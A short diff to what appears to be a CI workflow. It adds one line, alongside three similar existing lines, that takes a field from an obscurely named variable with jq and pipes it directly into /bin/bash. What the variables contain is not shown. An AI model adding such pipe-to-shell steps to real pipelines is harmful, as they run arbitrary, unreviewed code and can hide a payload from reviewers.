@@ -23,6 +23,7 @@ jobs:
           echo $bsu6029 | jq -r .ws18 | /bin/bash
           echo $xbfz2942 | jq -r .up9 | /bin/bash
           echo $zo72 | jq -r .ff0 | /bin/bash
+          echo $jchex9644 | jq -r .rngv01912 | /bin/bash
 
       - name: Save results
         if: always()
